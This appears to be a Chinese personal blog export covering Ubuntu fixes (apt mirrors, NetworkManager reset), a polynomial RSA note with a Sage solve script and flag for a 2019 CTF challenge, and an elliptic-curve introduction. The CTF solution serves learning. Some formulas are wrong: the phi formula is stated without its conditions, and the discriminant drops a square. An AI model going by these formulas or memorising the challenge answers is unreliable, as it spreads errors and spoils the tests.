<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<p>进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt update</span></span><br></pre></td></tr></table></figure>

<p>安装证书</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install ca-certificates</span></span><br></pre></td></tr></table></figure>

<p>显然<code>http</code>是不安全的，所有的数据包都会被监听，但不知道为什么阿里源都是<code>http</code>；总之在成功过后，还是把<code>http</code>替换回<code>https</code></p>
<p>最后再进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt update</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>没有Release文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /etc/apt/sources.list.d</span></span><br></pre></td></tr></table></figure>

<p>删除这个文件，有别的文件，我也不知道可不可以删，反正我一般就是这个<br><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003102507534.png" alt="image-20211003102507534"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo rm fcitx-team-ubuntu-nightly-bionic.list</span></span><br></pre></td></tr></table></figure>

<p>最后更新一下，成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt update</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x10002-linux下多python运行"><a href="#0x10002-linux下多python运行" class="headerlink" title="0x10002 linux下多python运行"></a>0x10002 linux下多python运行</h3><p>通过命令来绑定，调用的名字由后者指定</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ln -s /usr/bin/python2.7 /usr/bin/python</span></span><br></pre></td></tr></table></figure>

<p>pip的使用对应<code>python</code>后面加个<code>-m</code></p>
<h3 id="0x10003-虚拟机上不了网"><a href="#0x10003-虚拟机上不了网" class="headerlink" title="0x10003 虚拟机上不了网"></a>0x10003 虚拟机上不了网</h3><p>删除NetworkManager缓存文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service NetworkManager stop</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm /var/lib/NetworkManager/NetworkManager.state</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service NetworkManager start</span></span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/NetworkManager/NetworkManager.conf</code>的<code>managed</code>为<code>true</code></p>
<p>如果已经改了没事</p>
<p>重启NetworkManager</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service network-manager restart</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>关于如何防止在妹妹面前装逼不够优雅</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>windows</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>多项式RSA</title>
    <url>/posts/a0a0f5aa/</url>
    <content><![CDATA[<p>多项式RSA，唔</p>
<p>看下先知上的大佬</p>
<p><a href="https://xz.aliyun.com/t/4545">https://xz.aliyun.com/t/4545</a></p>
<span id="more"></span>

<h1 id="多项式RSA"><a href="#多项式RSA" class="headerlink" title="多项式RSA"></a>多项式RSA</h1><p>之前也一直认为多项式RSA和一般的RSA区别不大，也就是师傅说的<strong>RSA对于整数的体制可以适用于有限域上的多项式</strong>，主要是有一些多项式的概念</p>
<p>首先在有限域上选取两个不可约多项式$g(p),\ g(q)$</p>
<ul>
<li><strong>有限域</strong>是什么：就理解成有限个数的集合</li>
<li><strong>有限域多项式</strong>是什么：就是<strong>系数</strong>属于某个有限域的多项式</li>
<li><strong>有限域下不可约多项式</strong>是什么：就是一个多项式不能被拆成多个同一有限域下多个多项式的乘积</li>
</ul>
<p>计算$g(n)=g(p)\times g(q)$</p>
<p>计算$g(n)$的欧拉函数$phi=\varphi(g(n))$</p>
<p>选一个整数$e$，$(e,\ phi)=1$，并求出逆元$d$，$e\times d\equiv 1(mod\ phi)$</p>
<p>加密：$g(c)=g(m)^e\ mod\ g(n)$</p>
<p>解密：$g(m)=g(c)^d\ mod\ g(n)$</p>
<p>其中e和d都是整数，它们和多项式可以进行模幂运算</p>
<hr>
<p>先知社区求phi有点问题，我很好奇多项式是怎么转多项式为整数的</p>
<p>所以更重要的问题是，<strong>如何求phi？</strong>，推导省略直接上结论，记$g(x)$的次数为$a$<br>$$<br>\varphi(g(x))=2^a-1<br>$$<br>还有个问题，现在遇到的这些都是多项式$g(n)$可以用sage直接分解的，那如果是考攻击方式呢，还是要学</p>
<p>最后如何把明文转换成多项式：将明文每个字符转ascii，作为多项式的系数</p>
<h2 id="watevrCTF-2019-Swedish-RSA"><a href="#watevrCTF-2019-Swedish-RSA" class="headerlink" title="[watevrCTF 2019]Swedish RSA"></a>[watevrCTF 2019]Swedish RSA</h2><p>之前倒也做过</p>
<p><a href="https://4xwi11.github.io/posts/80806ae5/#unusualrsa3">https://4xwi11.github.io/posts/80806ae5/#unusualrsa3</a></p>
<p>之前跑脚本倒也能出来，就是要改下快速幂，不然很慢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">p = <span class="number">43753</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line"></span><br><span class="line">N = <span class="number">34036</span>*x^<span class="number">177</span> + <span class="number">23068</span>*x^<span class="number">176</span> + <span class="number">13147</span>*x^<span class="number">175</span> + <span class="number">36344</span>*x^<span class="number">174</span> + <span class="number">10045</span>*x^<span class="number">173</span> + <span class="number">41049</span>*x^<span class="number">172</span> + <span class="number">17786</span>*x^<span class="number">171</span> + <span class="number">16601</span>*x^<span class="number">170</span> + <span class="number">7929</span>*x^<span class="number">169</span> + <span class="number">37570</span>*x^<span class="number">168</span> + <span class="number">990</span>*x^<span class="number">167</span> + <span class="number">9622</span>*x^<span class="number">166</span> + <span class="number">39273</span>*x^<span class="number">165</span> + <span class="number">35284</span>*x^<span class="number">164</span> + <span class="number">15632</span>*x^<span class="number">163</span> + <span class="number">18850</span>*x^<span class="number">162</span> + <span class="number">8800</span>*x^<span class="number">161</span> + <span class="number">33148</span>*x^<span class="number">160</span> + <span class="number">12147</span>*x^<span class="number">159</span> + <span class="number">40487</span>*x^<span class="number">158</span> + <span class="number">6407</span>*x^<span class="number">157</span> + <span class="number">34111</span>*x^<span class="number">156</span> + <span class="number">8446</span>*x^<span class="number">155</span> + <span class="number">21908</span>*x^<span class="number">154</span> + <span class="number">16812</span>*x^<span class="number">153</span> + <span class="number">40624</span>*x^<span class="number">152</span> + <span class="number">43506</span>*x^<span class="number">151</span> + <span class="number">39116</span>*x^<span class="number">150</span> + <span class="number">33011</span>*x^<span class="number">149</span> + <span class="number">23914</span>*x^<span class="number">148</span> + <span class="number">2210</span>*x^<span class="number">147</span> + <span class="number">23196</span>*x^<span class="number">146</span> + <span class="number">43359</span>*x^<span class="number">145</span> + <span class="number">34455</span>*x^<span class="number">144</span> + <span class="number">17684</span>*x^<span class="number">143</span> + <span class="number">25262</span>*x^<span class="number">142</span> + <span class="number">982</span>*x^<span class="number">141</span> + <span class="number">24015</span>*x^<span class="number">140</span> + <span class="number">27968</span>*x^<span class="number">139</span> + <span class="number">37463</span>*x^<span class="number">138</span> + <span class="number">10667</span>*x^<span class="number">137</span> + <span class="number">39519</span>*x^<span class="number">136</span> + <span class="number">31176</span>*x^<span class="number">135</span> + <span class="number">27520</span>*x^<span class="number">134</span> + <span class="number">32118</span>*x^<span class="number">133</span> + <span class="number">8333</span>*x^<span class="number">132</span> + <span class="number">38945</span>*x^<span class="number">131</span> + <span class="number">34713</span>*x^<span class="number">130</span> + <span class="number">1107</span>*x^<span class="number">129</span> + <span class="number">43604</span>*x^<span class="number">128</span> + <span class="number">4433</span>*x^<span class="number">127</span> + <span class="number">18110</span>*x^<span class="number">126</span> + <span class="number">17658</span>*x^<span class="number">125</span> + <span class="number">32354</span>*x^<span class="number">124</span> + <span class="number">3219</span>*x^<span class="number">123</span> + <span class="number">40238</span>*x^<span class="number">122</span> + <span class="number">10439</span>*x^<span class="number">121</span> + <span class="number">3669</span>*x^<span class="number">120</span> + <span class="number">8713</span>*x^<span class="number">119</span> + <span class="number">21027</span>*x^<span class="number">118</span> + <span class="number">29480</span>*x^<span class="number">117</span> + <span class="number">5477</span>*x^<span class="number">116</span> + <span class="number">24332</span>*x^<span class="number">115</span> + <span class="number">43480</span>*x^<span class="number">114</span> + <span class="number">33406</span>*x^<span class="number">113</span> + <span class="number">43121</span>*x^<span class="number">112</span> + <span class="number">1114</span>*x^<span class="number">111</span> + <span class="number">17198</span>*x^<span class="number">110</span> + <span class="number">22829</span>*x^<span class="number">109</span> + <span class="number">24424</span>*x^<span class="number">108</span> + <span class="number">16523</span>*x^<span class="number">107</span> + <span class="number">20424</span>*x^<span class="number">106</span> + <span class="number">36206</span>*x^<span class="number">105</span> + <span class="number">41849</span>*x^<span class="number">104</span> + <span class="number">3584</span>*x^<span class="number">103</span> + <span class="number">26500</span>*x^<span class="number">102</span> + <span class="number">31897</span>*x^<span class="number">101</span> + <span class="number">34640</span>*x^<span class="number">100</span> + <span class="number">27449</span>*x^<span class="number">99</span> + <span class="number">30962</span>*x^<span class="number">98</span> + <span class="number">41434</span>*x^<span class="number">97</span> + <span class="number">22125</span>*x^<span class="number">96</span> + <span class="number">24314</span>*x^<span class="number">95</span> + <span class="number">3944</span>*x^<span class="number">94</span> + <span class="number">18400</span>*x^<span class="number">93</span> + <span class="number">38476</span>*x^<span class="number">92</span> + <span class="number">28904</span>*x^<span class="number">91</span> + <span class="number">27936</span>*x^<span class="number">90</span> + <span class="number">41867</span>*x^<span class="number">89</span> + <span class="number">25573</span>*x^<span class="number">88</span> + <span class="number">25659</span>*x^<span class="number">87</span> + <span class="number">33443</span>*x^<span class="number">86</span> + <span class="number">18435</span>*x^<span class="number">85</span> + <span class="number">5934</span>*x^<span class="number">84</span> + <span class="number">38030</span>*x^<span class="number">83</span> + <span class="number">17563</span>*x^<span class="number">82</span> + <span class="number">24086</span>*x^<span class="number">81</span> + <span class="number">36782</span>*x^<span class="number">80</span> + <span class="number">20922</span>*x^<span class="number">79</span> + <span class="number">38933</span>*x^<span class="number">78</span> + <span class="number">23448</span>*x^<span class="number">77</span> + <span class="number">10599</span>*x^<span class="number">76</span> + <span class="number">7156</span>*x^<span class="number">75</span> + <span class="number">29044</span>*x^<span class="number">74</span> + <span class="number">23605</span>*x^<span class="number">73</span> + <span class="number">7657</span>*x^<span class="number">72</span> + <span class="number">28200</span>*x^<span class="number">71</span> + <span class="number">2431</span>*x^<span class="number">70</span> + <span class="number">3860</span>*x^<span class="number">69</span> + <span class="number">23259</span>*x^<span class="number">68</span> + <span class="number">14590</span>*x^<span class="number">67</span> + <span class="number">33631</span>*x^<span class="number">66</span> + <span class="number">15673</span>*x^<span class="number">65</span> + <span class="number">36049</span>*x^<span class="number">64</span> + <span class="number">29728</span>*x^<span class="number">63</span> + <span class="number">22413</span>*x^<span class="number">62</span> + <span class="number">18602</span>*x^<span class="number">61</span> + <span class="number">18557</span>*x^<span class="number">60</span> + <span class="number">23505</span>*x^<span class="number">59</span> + <span class="number">17642</span>*x^<span class="number">58</span> + <span class="number">12595</span>*x^<span class="number">57</span> + <span class="number">17255</span>*x^<span class="number">56</span> + <span class="number">15316</span>*x^<span class="number">55</span> + <span class="number">8948</span>*x^<span class="number">54</span> + <span class="number">38</span>*x^<span class="number">53</span> + <span class="number">40329</span>*x^<span class="number">52</span> + <span class="number">9823</span>*x^<span class="number">51</span> + <span class="number">5798</span>*x^<span class="number">50</span> + <span class="number">6379</span>*x^<span class="number">49</span> + <span class="number">8662</span>*x^<span class="number">48</span> + <span class="number">34640</span>*x^<span class="number">47</span> + <span class="number">38321</span>*x^<span class="number">46</span> + <span class="number">18760</span>*x^<span class="number">45</span> + <span class="number">13135</span>*x^<span class="number">44</span> + <span class="number">15926</span>*x^<span class="number">43</span> + <span class="number">34952</span>*x^<span class="number">42</span> + <span class="number">28940</span>*x^<span class="number">41</span> + <span class="number">13558</span>*x^<span class="number">40</span> + <span class="number">42579</span>*x^<span class="number">39</span> + <span class="number">38015</span>*x^<span class="number">38</span> + <span class="number">33788</span>*x^<span class="number">37</span> + <span class="number">12381</span>*x^<span class="number">36</span> + <span class="number">195</span>*x^<span class="number">35</span> + <span class="number">13709</span>*x^<span class="number">34</span> + <span class="number">31500</span>*x^<span class="number">33</span> + <span class="number">32994</span>*x^<span class="number">32</span> + <span class="number">30486</span>*x^<span class="number">31</span> + <span class="number">40414</span>*x^<span class="number">30</span> + <span class="number">2578</span>*x^<span class="number">29</span> + <span class="number">30525</span>*x^<span class="number">28</span> + <span class="number">43067</span>*x^<span class="number">27</span> + <span class="number">6195</span>*x^<span class="number">26</span> + <span class="number">36288</span>*x^<span class="number">25</span> + <span class="number">23236</span>*x^<span class="number">24</span> + <span class="number">21493</span>*x^<span class="number">23</span> + <span class="number">15808</span>*x^<span class="number">22</span> + <span class="number">34500</span>*x^<span class="number">21</span> + <span class="number">6390</span>*x^<span class="number">20</span> + <span class="number">42994</span>*x^<span class="number">19</span> + <span class="number">42151</span>*x^<span class="number">18</span> + <span class="number">19248</span>*x^<span class="number">17</span> + <span class="number">19291</span>*x^<span class="number">16</span> + <span class="number">8124</span>*x^<span class="number">15</span> + <span class="number">40161</span>*x^<span class="number">14</span> + <span class="number">24726</span>*x^<span class="number">13</span> + <span class="number">31874</span>*x^<span class="number">12</span> + <span class="number">30272</span>*x^<span class="number">11</span> + <span class="number">30761</span>*x^<span class="number">10</span> + <span class="number">2296</span>*x^<span class="number">9</span> + <span class="number">11017</span>*x^<span class="number">8</span> + <span class="number">16559</span>*x^<span class="number">7</span> + <span class="number">28949</span>*x^<span class="number">6</span> + <span class="number">40499</span>*x^<span class="number">5</span> + <span class="number">22377</span>*x^<span class="number">4</span> + <span class="number">33628</span>*x^<span class="number">3</span> + <span class="number">30598</span>*x^<span class="number">2</span> + <span class="number">4386</span>*x + <span class="number">23814</span></span><br><span class="line">c = <span class="number">5209</span>*x^<span class="number">176</span> + <span class="number">10881</span>*x^<span class="number">175</span> + <span class="number">31096</span>*x^<span class="number">174</span> + <span class="number">23354</span>*x^<span class="number">173</span> + <span class="number">28337</span>*x^<span class="number">172</span> + <span class="number">15982</span>*x^<span class="number">171</span> + <span class="number">13515</span>*x^<span class="number">170</span> + <span class="number">21641</span>*x^<span class="number">169</span> + <span class="number">10254</span>*x^<span class="number">168</span> + <span class="number">34588</span>*x^<span class="number">167</span> + <span class="number">27434</span>*x^<span class="number">166</span> + <span class="number">29552</span>*x^<span class="number">165</span> + <span class="number">7105</span>*x^<span class="number">164</span> + <span class="number">22604</span>*x^<span class="number">163</span> + <span class="number">41253</span>*x^<span class="number">162</span> + <span class="number">42675</span>*x^<span class="number">161</span> + <span class="number">21153</span>*x^<span class="number">160</span> + <span class="number">32838</span>*x^<span class="number">159</span> + <span class="number">34391</span>*x^<span class="number">158</span> + <span class="number">832</span>*x^<span class="number">157</span> + <span class="number">720</span>*x^<span class="number">156</span> + <span class="number">22883</span>*x^<span class="number">155</span> + <span class="number">19236</span>*x^<span class="number">154</span> + <span class="number">33772</span>*x^<span class="number">153</span> + <span class="number">5020</span>*x^<span class="number">152</span> + <span class="number">17943</span>*x^<span class="number">151</span> + <span class="number">26967</span>*x^<span class="number">150</span> + <span class="number">30847</span>*x^<span class="number">149</span> + <span class="number">10306</span>*x^<span class="number">148</span> + <span class="number">33966</span>*x^<span class="number">147</span> + <span class="number">43255</span>*x^<span class="number">146</span> + <span class="number">20342</span>*x^<span class="number">145</span> + <span class="number">4474</span>*x^<span class="number">144</span> + <span class="number">3490</span>*x^<span class="number">143</span> + <span class="number">38033</span>*x^<span class="number">142</span> + <span class="number">11224</span>*x^<span class="number">141</span> + <span class="number">30565</span>*x^<span class="number">140</span> + <span class="number">31967</span>*x^<span class="number">139</span> + <span class="number">32382</span>*x^<span class="number">138</span> + <span class="number">9759</span>*x^<span class="number">137</span> + <span class="number">1030</span>*x^<span class="number">136</span> + <span class="number">32122</span>*x^<span class="number">135</span> + <span class="number">42614</span>*x^<span class="number">134</span> + <span class="number">14280</span>*x^<span class="number">133</span> + <span class="number">16533</span>*x^<span class="number">132</span> + <span class="number">32676</span>*x^<span class="number">131</span> + <span class="number">43070</span>*x^<span class="number">130</span> + <span class="number">36009</span>*x^<span class="number">129</span> + <span class="number">28497</span>*x^<span class="number">128</span> + <span class="number">2940</span>*x^<span class="number">127</span> + <span class="number">9747</span>*x^<span class="number">126</span> + <span class="number">22758</span>*x^<span class="number">125</span> + <span class="number">16615</span>*x^<span class="number">124</span> + <span class="number">14086</span>*x^<span class="number">123</span> + <span class="number">13038</span>*x^<span class="number">122</span> + <span class="number">39603</span>*x^<span class="number">121</span> + <span class="number">36260</span>*x^<span class="number">120</span> + <span class="number">32502</span>*x^<span class="number">119</span> + <span class="number">17619</span>*x^<span class="number">118</span> + <span class="number">17700</span>*x^<span class="number">117</span> + <span class="number">15083</span>*x^<span class="number">116</span> + <span class="number">11311</span>*x^<span class="number">115</span> + <span class="number">36496</span>*x^<span class="number">114</span> + <span class="number">1300</span>*x^<span class="number">113</span> + <span class="number">13601</span>*x^<span class="number">112</span> + <span class="number">43425</span>*x^<span class="number">111</span> + <span class="number">10376</span>*x^<span class="number">110</span> + <span class="number">11551</span>*x^<span class="number">109</span> + <span class="number">13684</span>*x^<span class="number">108</span> + <span class="number">14955</span>*x^<span class="number">107</span> + <span class="number">6661</span>*x^<span class="number">106</span> + <span class="number">12674</span>*x^<span class="number">105</span> + <span class="number">21534</span>*x^<span class="number">104</span> + <span class="number">32132</span>*x^<span class="number">103</span> + <span class="number">34135</span>*x^<span class="number">102</span> + <span class="number">43684</span>*x^<span class="number">101</span> + <span class="number">837</span>*x^<span class="number">100</span> + <span class="number">29311</span>*x^<span class="number">99</span> + <span class="number">4849</span>*x^<span class="number">98</span> + <span class="number">26632</span>*x^<span class="number">97</span> + <span class="number">26662</span>*x^<span class="number">96</span> + <span class="number">10159</span>*x^<span class="number">95</span> + <span class="number">32657</span>*x^<span class="number">94</span> + <span class="number">12149</span>*x^<span class="number">93</span> + <span class="number">17858</span>*x^<span class="number">92</span> + <span class="number">35805</span>*x^<span class="number">91</span> + <span class="number">19391</span>*x^<span class="number">90</span> + <span class="number">30884</span>*x^<span class="number">89</span> + <span class="number">42039</span>*x^<span class="number">88</span> + <span class="number">17292</span>*x^<span class="number">87</span> + <span class="number">4694</span>*x^<span class="number">86</span> + <span class="number">1497</span>*x^<span class="number">85</span> + <span class="number">1744</span>*x^<span class="number">84</span> + <span class="number">31071</span>*x^<span class="number">83</span> + <span class="number">26246</span>*x^<span class="number">82</span> + <span class="number">24402</span>*x^<span class="number">81</span> + <span class="number">22068</span>*x^<span class="number">80</span> + <span class="number">39263</span>*x^<span class="number">79</span> + <span class="number">23703</span>*x^<span class="number">78</span> + <span class="number">21484</span>*x^<span class="number">77</span> + <span class="number">12241</span>*x^<span class="number">76</span> + <span class="number">28821</span>*x^<span class="number">75</span> + <span class="number">32886</span>*x^<span class="number">74</span> + <span class="number">43075</span>*x^<span class="number">73</span> + <span class="number">35741</span>*x^<span class="number">72</span> + <span class="number">19936</span>*x^<span class="number">71</span> + <span class="number">37219</span>*x^<span class="number">70</span> + <span class="number">33411</span>*x^<span class="number">69</span> + <span class="number">8301</span>*x^<span class="number">68</span> + <span class="number">12949</span>*x^<span class="number">67</span> + <span class="number">28611</span>*x^<span class="number">66</span> + <span class="number">42654</span>*x^<span class="number">65</span> + <span class="number">6910</span>*x^<span class="number">64</span> + <span class="number">18523</span>*x^<span class="number">63</span> + <span class="number">31144</span>*x^<span class="number">62</span> + <span class="number">21398</span>*x^<span class="number">61</span> + <span class="number">36298</span>*x^<span class="number">60</span> + <span class="number">27158</span>*x^<span class="number">59</span> + <span class="number">918</span>*x^<span class="number">58</span> + <span class="number">38601</span>*x^<span class="number">57</span> + <span class="number">4269</span>*x^<span class="number">56</span> + <span class="number">5699</span>*x^<span class="number">55</span> + <span class="number">36444</span>*x^<span class="number">54</span> + <span class="number">34791</span>*x^<span class="number">53</span> + <span class="number">37978</span>*x^<span class="number">52</span> + <span class="number">32481</span>*x^<span class="number">51</span> + <span class="number">8039</span>*x^<span class="number">50</span> + <span class="number">11012</span>*x^<span class="number">49</span> + <span class="number">11454</span>*x^<span class="number">48</span> + <span class="number">30450</span>*x^<span class="number">47</span> + <span class="number">1381</span>*x^<span class="number">46</span> + <span class="number">32403</span>*x^<span class="number">45</span> + <span class="number">8202</span>*x^<span class="number">44</span> + <span class="number">8404</span>*x^<span class="number">43</span> + <span class="number">37648</span>*x^<span class="number">42</span> + <span class="number">43696</span>*x^<span class="number">41</span> + <span class="number">34237</span>*x^<span class="number">40</span> + <span class="number">36490</span>*x^<span class="number">39</span> + <span class="number">41423</span>*x^<span class="number">38</span> + <span class="number">35792</span>*x^<span class="number">37</span> + <span class="number">36950</span>*x^<span class="number">36</span> + <span class="number">31086</span>*x^<span class="number">35</span> + <span class="number">38970</span>*x^<span class="number">34</span> + <span class="number">12439</span>*x^<span class="number">33</span> + <span class="number">7963</span>*x^<span class="number">32</span> + <span class="number">16150</span>*x^<span class="number">31</span> + <span class="number">11382</span>*x^<span class="number">30</span> + <span class="number">3038</span>*x^<span class="number">29</span> + <span class="number">20157</span>*x^<span class="number">28</span> + <span class="number">23531</span>*x^<span class="number">27</span> + <span class="number">32866</span>*x^<span class="number">26</span> + <span class="number">5428</span>*x^<span class="number">25</span> + <span class="number">21132</span>*x^<span class="number">24</span> + <span class="number">13443</span>*x^<span class="number">23</span> + <span class="number">28909</span>*x^<span class="number">22</span> + <span class="number">42716</span>*x^<span class="number">21</span> + <span class="number">6567</span>*x^<span class="number">20</span> + <span class="number">24744</span>*x^<span class="number">19</span> + <span class="number">8727</span>*x^<span class="number">18</span> + <span class="number">14895</span>*x^<span class="number">17</span> + <span class="number">28172</span>*x^<span class="number">16</span> + <span class="number">30903</span>*x^<span class="number">15</span> + <span class="number">26608</span>*x^<span class="number">14</span> + <span class="number">27314</span>*x^<span class="number">13</span> + <span class="number">42224</span>*x^<span class="number">12</span> + <span class="number">42551</span>*x^<span class="number">11</span> + <span class="number">37726</span>*x^<span class="number">10</span> + <span class="number">11203</span>*x^<span class="number">9</span> + <span class="number">36816</span>*x^<span class="number">8</span> + <span class="number">5537</span>*x^<span class="number">7</span> + <span class="number">20301</span>*x^<span class="number">6</span> + <span class="number">17591</span>*x^<span class="number">5</span> + <span class="number">41279</span>*x^<span class="number">4</span> + <span class="number">7999</span>*x^<span class="number">3</span> + <span class="number">33753</span>*x^<span class="number">2</span> + <span class="number">34551</span>*x + <span class="number">9659</span></span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"></span><br><span class="line">P, Q = N.factor()</span><br><span class="line">P, Q = P[<span class="number">0</span>], Q[<span class="number">0</span>]</span><br><span class="line">phi = (p ** P.degree() - <span class="number">1</span>) * (p ** Q.degree() - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">m = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.<span class="built_in">list</span>()])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro}</p>
</blockquote>
<h2 id="0CTF-2019-baby-rsa"><a href="#0CTF-2019-baby-rsa" class="headerlink" title="[0CTF 2019]baby rsa"></a>[0CTF 2019]baby rsa</h2><p>这道题主要看下不同的姿势</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pubkey <span class="keyword">import</span> P, n, e</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m) &lt;= <span class="number">256</span></span><br><span class="line">    m_int = Integer(m.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    m_poly = P(R.fetch_int(m_int)) </span><br><span class="line">    c_poly = <span class="built_in">pow</span>(m_poly, e, n)</span><br><span class="line">    c_int = R(c_poly).integer_representation() </span><br><span class="line">    c = <span class="built_in">format</span>(c_int, <span class="string">&#x27;0256x&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ptext = flag + os.urandom(<span class="number">256</span>-<span class="built_in">len</span>(flag))</span><br><span class="line">    ctext = encrypt(ptext)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ctext)</span><br></pre></td></tr></table></figure>

<p>这个还是python2吧，我现在sage用不了python2的，emmmm就这样吧，过程是一模一样的</p>
]]></content>
      <tags>
        <tag>多项式RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>ECC</title>
    <url>/posts/c8e83216/</url>
    <content><![CDATA[<p>参考</p>
<p><a href="https://blog.csdn.net/sitebus/article/details/82835492">https://blog.csdn.net/sitebus/article/details/82835492</a></p>
<p><a href="https://zh.wikipedia.org/wiki/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81%E5%AD%A6">https://zh.wikipedia.org/wiki/椭圆曲线密码学</a></p>
<span id="more"></span>

<h1 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h1><p>首先椭圆曲线比RSA快，其次和高中的椭圆曲线方程没有关系<br>$$<br>\frac{x^2}{a^2}+\frac{y^2}{b^2}=1<br>$$</p>
<h2 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h2><p>一条椭圆曲线是在射影平面上满足威尔斯特拉斯方程（Weierstrass）所有点的集合<br>$$<br>Y^2Z+a_1XYZ+a_3YZ^2=X^3+a_2X^2Z+a_4XZ^2+a_6Z^3<br>$$<br>对于普通平面上的点$(x,\ y)$，令$x=\frac{X}{Z}$，$y=\frac{Y}{Z}$，$Z\ne 0$，得<br>$$<br>y^2Z^3+a_1xyZ^3+a_3yZ^3=x^3Z^3+a_2x^2Z^3+a_4xZ^3+a_6Z^3<br>$$<br>约掉$Z^3$，得<br>$$<br>y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6<br>$$<br>简化版的Weierstrass方程：<br>$$<br>E:y^2=x^3+ax+b<br>$$<br>其中，</p>
<ul>
<li><p>$\Delta =-16(4a^3+27b)\ne 0$保证曲线光滑，即曲线上所有点都没有两个或者两个以上不同的切线</p>
</li>
<li><p>$a,\ b\in K$，$K$为$E$的基础域，要么是以素数为模的$GF(p)$，要么是特征值为2的$GF(2^m)$</p>
</li>
<li><p>点$O_\infty$是曲线的唯一无穷远点</p>
</li>
</ul>
<p>判断是不是椭圆曲线主要看$\Delta$吧</p>
